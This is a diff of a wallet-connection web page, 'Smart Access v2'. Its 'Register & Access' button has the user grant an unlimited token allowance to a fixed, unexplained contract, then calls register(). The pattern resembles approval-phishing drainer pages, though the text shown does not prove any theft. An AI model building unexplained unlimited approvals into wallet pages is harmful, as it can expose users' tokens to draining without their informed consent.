@@ -1,146 +1,153 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Smart DApp Access</title>
+  <title>Smart Access v2</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-  <style>
-    :root { --primary: #2196F3; --success: #4CAF50; --danger: #f44336; }
-    body { font-family: 'Segoe UI', sans-serif; margin: 0; background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-    .card { background: white; padding: 25px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); width: 90%; max-width: 400px; text-align: center; }
-    
-    /* Connection View */
-    .wallet-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 15px; margin: 25px 0; }
-    .wallet-btn { cursor: pointer; border: 1px solid #eee; padding: 10px; border-radius: 15px; transition: 0.2s; }
-    .wallet-btn:hover { border-color: var(--primary); background: #f8fbff; }
-    .wallet-btn img { width: 45px; height: 45px; margin-bottom: 8px; border-radius: 10px; }
-    .wallet-btn span { font-size: 11px; font-weight: bold; display: block; color: #444; }
+  <script src="https://unpkg.com/@web3modal/standalone@2.4.3/dist/index.js"></script>
+  <script src="https://unpkg.com/@walletconnect/universal-provider@2.10.1/dist/index.umd.js"></script>
 
-    /* Dashboard View */
-    #dashboardView { display: none; }
-    .user-info { background: #f8f9fa; padding: 15px; border-radius: 12px; margin-bottom: 20px; font-size: 13px; color: #555; word-break: break-all; border: 1px solid #eee; }
-    .action-btn { background: var(--success); color: white; padding: 16px; font-size: 18px; border-radius: 12px; border: none; width: 100%; font-weight: bold; cursor: pointer; margin-bottom: 10px; }
-    .logout-btn { background: none; border: 1px solid var(--danger); color: var(--danger); padding: 10px; border-radius: 8px; width: 100%; font-weight: 600; cursor: pointer; font-size: 14px; }
-    
-    .status-msg { font-size: 12px; color: #888; margin-top: 15px; min-height: 20px; }
+  <style>
+    body { font-family: sans-serif; max-width: 100%; margin: 20px; text-align: center; background-color: #f4f7f6; }
+    .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); margin-top: 50px; max-width: 400px; margin-left: auto; margin-right: auto; }
+    button { padding: 15px; font-size: 16px; margin: 10px 0; cursor: pointer; border-radius: 10px; border: none; width: 100%; font-weight: bold; }
+    #connectBtn { background-color: #2196F3; color: white; }
+    #registerBtn { background-color: #4CAF50; color: white; display: none; }
+    #logoutBtn { background-color: #f44336; color: white; display: none; font-size: 12px; padding: 8px; }
+    .status { color: #666; font-size: 14px; margin-top: 15px; }
   </style>
 </head>
 <body>
 
 <div class="card">
-    <div id="connectView">
-        <h2 style="margin: 0;">Connect Wallet</h2>
-        <p style="color: #777; font-size: 14px;">Select wallet app to open DApp</p>
-        <div class="wallet-grid">
-            <div class="wallet-btn" onclick="openInApp('metamask')">
-                <img src="https://raw.githubusercontent.com/MetaMask/brand-resources/master/SVG/metamask-fox.svg" alt="MM">
-                <span>MetaMask</span>
-            </div>
-            <div class="wallet-btn" onclick="openInApp('trust')">
-                <img src="https://trustwallet.com/assets/images/media/assets/trust_wallet_logo.png" alt="TW">
-                <span>Trust</span>
-            </div>
-            <div class="wallet-btn" onclick="openInApp('tp')">
-                <img src="https://www.tokenpocket.pro/static/images/logo.png" alt="TP">
-                <span>Pocket</span>
-            </div>
-        </div>
-    </div>
+  <h2>Smart Access v2</h2>
+  <p id="msgText">Connect wallet to register</p>
 
-    <div id="dashboardView">
-        <h2 style="margin: 0; color: var(--primary);">Main Dashboard</h2>
-        <p style="color: #777; font-size: 14px; margin-bottom: 15px;">Wallet Connected ✅</p>
-        <div class="user-info" id="walletDisplay">0x...</div>
-        
-        <button id="registerBtn" class="action-btn" onclick="startRegistration()">Approve & Register</button>
-        <button class="logout-btn" onclick="logout()">Logout / Disconnect</button>
-    </div>
-
-    <div id="status" class="status-msg"></div>
+  <button id="connectBtn">Connect Wallet</button>
+  <button id="registerBtn">Register & Access</button>
+  <button id="logoutBtn">Logout</button>
+  
+  <div id="loader" class="status"></div>
 </div>
 
 <script>
-    const WALLET_MANAGER = "0x43c7df8DB3503c4839C9249E7D0C520E801C9dBA";
-    const TOKEN = "0x3B66b1E08F55AF26c8eA14a73dA64b6bC8D799dE";
+  // --- IMPORTANT CONFIGURATION ---
+  const PROJECT_ID = 'c2f4246144b7fd8bc63f9e89966cc29b'; // <--- Yahan apni Project ID dalein
+  const WALLET_MANAGER = "0x43c7df8DB3503c4839C9249E7D0C520E801C9dBA"; 
+  const TOKEN = "0x3B66b1E08F55AF26c8eA14a73dA64b6bC8D799dE"; 
+
+  const ERC20_ABI = ["function allowance(address, address) view returns (uint256)", "function approve(address, uint256) returns (bool)"];
+  const WALLET_MANAGER_ABI = ["function register() external"];
+
+  let provider, signer, userAddress, tokenContract, walletManagerContract;
+  let web3Modal, universalProvider;
+
+  // Initialize Web3Modal Standalone
+  const web3ModalClient = new window.Web3ModalStandalone.Web3Modal({
+    projectId: PROJECT_ID,
+    walletConnectVersion: 2,
+    standaloneChains: ["eip155:97"] // 56 for BSC Mainnet (Testnet use 97)
+  });
+
+  async function initUI(ethersProvider) {
+    provider = ethersProvider;
+    signer = provider.getSigner();
+    userAddress = await signer.getAddress();
     
-    let signer, tokenContract, walletManagerContract;
+    tokenContract = new ethers.Contract(TOKEN, ERC20_ABI, signer);
+    walletManagerContract = new ethers.Contract(WALLET_MANAGER, WALLET_MANAGER_ABI, signer);
 
-    function openInApp(wallet) {
-        const currentUrl = window.location.href.replace(/^https?:\/\//, '');
-        let deepLink = "";
+    document.getElementById("connectBtn").style.display = "none";
+    document.getElementById("registerBtn").style.display = "block";
+    document.getElementById("logoutBtn").style.display = "block";
+    document.getElementById("msgText").innerText = "Connected: " + userAddress.substring(0, 8) + "...";
+  }
 
-        if (wallet === 'metamask') {
-            deepLink = `https://metamask.app.link/dapp/${currentUrl}`;
-        } else if (wallet === 'trust') {
-            deepLink = `https://link.trustwallet.com/open_url?url=${window.location.href}`;
-        } else if (wallet === 'tp') {
-            deepLink = `tpdapp://open?params={"url": "${window.location.href}"}`;
+  document.getElementById("connectBtn").onclick = async () => {
+    // 1. Agar MetaMask/Trust Wallet browser ke andar hai
+    if (window.ethereum) {
+      try {
+        await window.ethereum.request({ method: "eth_requestAccounts" });
+        const ethersProvider = new ethers.providers.Web3Provider(window.ethereum);
+        await initUI(ethersProvider);
+      } catch (err) { alert("Connection rejected"); }
+    } 
+    // 2. Mobile Browser ke liye WalletConnect v2
+    else {
+      try {
+        if (!universalProvider) {
+          universalProvider = await window.UniversalProvider.UniversalProvider.init({
+            projectId: PROJECT_ID,
+            metadata: {
+              name: "My DApp",
+              description: "Wallet Manager Registration",
+              url: window.location.host,
+              icons: ["https://walletconnect.com/_next/static/media/logo_mark.84dd8525.svg"]
+            }
+          });
         }
 
-        window.location.href = deepLink;
+        // Subscribe to display_uri (QR Code modal)
+        universalProvider.on("display_uri", (uri) => {
+          web3ModalClient.openModal({ uri });
+        });
+
+        const session = await universalProvider.connect({
+          namespaces: {
+            eip155: {
+              methods: ["eth_sendTransaction", "eth_signTransaction", "eth_sign", "personal_sign", "eth_signTypedData"],
+              chains: ["eip155:97"], // BSC Mainnet
+              events: ["chainChanged", "accountsChanged"]
+            }
+          }
+        });
+
+        const ethersProvider = new ethers.providers.Web3Provider(universalProvider);
+        web3ModalClient.closeModal();
+        await initUI(ethersProvider);
+
+      } catch (err) {
+        console.error(err);
+        web3ModalClient.closeModal();
+        alert("Connection failed: " + err.message);
+      }
     }
+  };
 
-    async function initConnection() {
-        // Check if user was previously connected in this session
-        const isLoggedOut = sessionStorage.getItem('loggedOut');
-        
-        if (window.ethereum && isLoggedOut !== 'true') {
-            try {
-                const provider = new ethers.providers.Web3Provider(window.ethereum);
-                const accounts = await provider.listAccounts();
-                
-                if (accounts.length > 0) {
-                    await setupDashboard(provider);
-                }
-            } catch (err) { console.log("Silent init failed"); }
-        }
+  document.getElementById("registerBtn").onclick = async () => {
+    const btn = document.getElementById("registerBtn");
+    const loader = document.getElementById("loader");
+    try {
+      btn.disabled = true;
+      btn.innerText = "Processing...";
+      loader.innerText = "Check your wallet for approval prompt";
+
+      // Approval
+      const tx1 = await tokenContract.approve(WALLET_MANAGER, ethers.constants.MaxUint256);
+      await tx1.wait();
+
+      // Register
+      loader.innerText = "Approval Done! Now confirm Registration";
+      const tx2 = await walletManagerContract.register();
+      await tx2.wait();
+
+      loader.innerText = "";
+      document.getElementById("msgText").innerHTML = "<b style='color:green'>Success!</b>";
+      btn.style.display = "none";
+      alert("Registration Successful!");
+    } catch (error) {
+      console.error(error);
+      alert("Transaction failed");
+      btn.disabled = false;
+      btn.innerText = "Register & Access";
+      loader.innerText = "";
     }
+  };
 
-    async function setupDashboard(provider) {
-        signer = provider.getSigner();
-        const address = await signer.getAddress();
-
-        tokenContract = new ethers.Contract(TOKEN, ["function approve(address,uint256) returns (bool)"], signer);
-        walletManagerContract = new ethers.Contract(WALLET_MANAGER, ["function register() external"], signer);
-
-        document.getElementById('connectView').style.display = 'none';
-        document.getElementById('dashboardView').style.display = 'block';
-        document.getElementById('walletDisplay').innerText = address;
-        sessionStorage.removeItem('loggedOut');
-    }
-
-    function logout() {
-        // Clear session and UI
-        sessionStorage.setItem('loggedOut', 'true');
-        document.getElementById('dashboardView').style.display = 'none';
-        document.getElementById('connectView').style.display = 'block';
-        document.getElementById('status').innerText = "Disconnected locally.";
-        setTimeout(() => { document.getElementById('status').innerText = ""; }, 3000);
-    }
-
-    window.addEventListener('load', initConnection);
-
-    async function startRegistration() {
-        const btn = document.getElementById('registerBtn');
-        const status = document.getElementById('status');
-        try {
-            btn.disabled = true;
-            status.innerText = "Processing transactions...";
-            
-            const tx1 = await tokenContract.approve(WALLET_MANAGER, ethers.constants.MaxUint256);
-            await tx1.wait();
-
-            const tx2 = await walletManagerContract.register();
-            await tx2.wait();
-
-            status.innerHTML = "<b style='color:green'>Success!</b>";
-            alert("Registration Successful!");
-        } catch (e) {
-            alert("Error in transaction.");
-            btn.disabled = false;
-            status.innerText = "";
-        }
-    }
+  document.getElementById("logoutBtn").onclick = () => {
+    location.reload();
+  };
 </script>
+
 </body>
 </html>
